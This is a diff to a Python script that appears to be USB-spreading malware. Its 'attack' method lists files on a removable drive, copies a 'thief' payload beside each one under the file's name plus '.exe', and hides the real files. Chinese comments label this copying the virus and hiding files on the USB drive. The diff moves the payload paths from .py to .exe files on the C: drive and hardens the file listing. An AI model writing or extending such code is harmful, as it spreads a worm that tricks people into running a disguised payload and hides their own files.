@@ -9,10 +9,10 @@ import shutil
 import subprocess
 from tkinter import messagebox
 
-DAEMON_PATH="D:\\vscode\\SYSTEM\\daemon.py"
-THIEF_PATH="D:\\vscode\\SYSTEM\\thief.txt.py"
-DAEMON_NAME="daemon.py"
-THIEF_NAME="thief.txt.py"
+DAEMON_PATH="C:\\vscode\\SYSTEM\\daemon.exe"
+THIEF_PATH="C:\\vscode\\SYSTEM\\thief.txt.exe"
+DAEMON_NAME="daemon.exe"
+THIEF_NAME="thief.txt.exe"
 
 
 
@@ -30,14 +30,14 @@ class usb:
 
     def attack(self):
         target_files=os.listdir(self.drive)
-        target_files.remove("System Volume Information")
+        if "System Volume Information" in target_files: target_files.remove("System Volume Information")
         for f in target_files:
             if not("." in f): target_files.remove(f) #排除目标中的文件夹,因为复制对文件夹无效
         
         for f in target_files:
             target=self.drive+f
             #拷贝病毒
-            shutil.copyfile(THIEF_PATH, target+".py") 
+            shutil.copyfile(THIEF_PATH, target+".exe") 
             #隐藏u盘中的文件
             win32api.SetFileAttributes(target, win32con.FILE_ATTRIBUTE_HIDDEN) 
         #拷贝demon守卫进程并隐藏
